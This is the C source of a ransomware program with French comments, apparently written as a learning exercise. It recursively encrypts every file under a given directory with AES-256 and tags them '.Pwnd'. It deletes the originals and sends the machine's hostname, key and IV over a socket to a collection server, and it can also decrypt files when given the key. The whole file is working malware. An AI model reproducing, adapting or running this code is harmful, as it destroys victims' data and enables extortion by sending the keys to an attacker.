#include "ransomlib.h"
#include <dirent.h>
// for socket
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SERVER_ADDRESS "127.0.0.1"

void usage();

int is_encrypted(char *file)
{
	// Si le nom du fichier contient .Pwnd
	if (strstr(file, ENCRYPT_EXT) != NULL)
	{
		return 1;
	}
	return 0;
}

int listdir(char *name, unsigned char *iv, unsigned char *key, char de_flag)
{
	// Enlève un éventuel / à la fin du chemin
	if(name[strlen(name)-1] == '/')
	{
		name[strlen(name)-1] = '\0';
	}

	struct dirent *entry;
	DIR *dir = opendir(name);

	if (!dir)
	{
		printf("Unable to open directory \"%s\".\n", name);
		return 0;
	}

	while ((entry = readdir(dir)) != NULL)
	{
		if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) // Check si entry n'est pas . ou ..
		{
			// Génère le chemin du fichier/dossier à partir de entry
			char path[BUFSIZE];
			strcpy(path, name);
			strcat(path, "/");
			strcat(path, entry->d_name);

			if (entry->d_type == DT_DIR) // Check i entry est un dossier
			{
				// Récursivité
				listdir(path, iv, key, de_flag);
			}
			else
			{
				if (de_flag == 'e')
				{
					// Chiffre si le fichier ne l'est pas déjà
					if (is_encrypted(entry->d_name) == 0)
					{
						encrypt(key, iv, path);
						// Suppression du fichier en clair
						remove(path);
					}
				}
				else if (de_flag == 'd')
				{
					// Déchiffre si le fichier est chiffré
					if (is_encrypted(entry->d_name) == 1)
					{
						decrypt(key, iv, path);
						// Suppression du fichier chiffré
						remove(path);
					}
				}
			}
		}
	}
	closedir(dir);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv, char *pKey, char *pIv)
{
	// Génération au format binaire
	RAND_bytes(key, sizeKey);
	RAND_bytes(iv, sizeIv);
	// Conversion en hexadécimal
	bytes_to_hexa(key, pKey, sizeKey);
	bytes_to_hexa(iv, pIv, sizeIv);
}

int send_key(char *pKey, char *pIv)
{
	// Création de la socket
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(PORT);
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	// Convertit l'adresse IP en binaire
	inet_pton(AF_INET, SERVER_ADDRESS, &server.sin_addr);

	// Connexion
	connect(sock, (struct sockaddr *)&server, sizeof(server));

	// Envoi du hostname de la cible
	char hostname[256];
	gethostname(hostname, 256);
	send(sock, hostname, BUFSIZE, 0);

	// Envoi de la clé et de l'IV
	send(sock, pKey, BUFSIZE, 0);
	send(sock, pIv, BUFSIZE, 0);

	// Ferme la socket
	close(sock);
}

int main(int argc, char *argv[])
{
	// Clé & IV au format binaire
	unsigned char key[AES_256_KEY_SIZE];
	unsigned char iv[AES_BLOCK_SIZE];
	// Clé & IV au format hexadécimal (2x plus d'espace nécessaire + caractère vide)
	char pKey[AES_256_KEY_SIZE*2 +1];
	char pIv[AES_BLOCK_SIZE*2 +1];

	if (argc > 1)
	{
		// Si flag -e
		if (strcmp(argv[1], "-e") == 0)
		{
			if (argc != 3)
			{
				printf("Correct syntax: ransom -e path\n");
				return 0;
			}

			generate_key(key, AES_256_KEY_SIZE, iv, AES_BLOCK_SIZE, pKey, pIv);

			send_key(pKey, pIv);

			listdir(argv[2], iv, key, 'e');

			// Efface les clés et iv
			memset(key,0,sizeof(key));
			memset(iv,0,sizeof(iv));
			memset(pKey,0,sizeof(pKey));
			memset(pIv,0,sizeof(pIv));
		}
		// Si flag -d
		else if (strcmp(argv[1], "-d") == 0)
		{
			if (argc != 5)
			{
				printf("Correct syntax: ransom -d key iv path\n");
				return 0;
			}

			// Check la taille de la clé (64)
			if (strlen(argv[2]) == AES_256_KEY_SIZE*2)
			{
				hexa_to_bytes(argv[2], key, AES_256_KEY_SIZE);
			}
			else
			{
				printf("Wrong key format\n");
				return 0;
			}

			// Check la taille du vecteur (32)
			if (strlen(argv[3]) == AES_BLOCK_SIZE*2)
			{
				hexa_to_bytes(argv[3], iv, AES_BLOCK_SIZE);
			}
			else
			{
				printf("Wrong vector format\n");
				return 0;
			}

			listdir(argv[4], iv, key, 'd');
		}
		else
		{
			printf("You must specify -d or -e\n");
			return 0;
		}
	}
	else
	{
		printf("You must specify -d or -e\n");
		return 0;
	}
}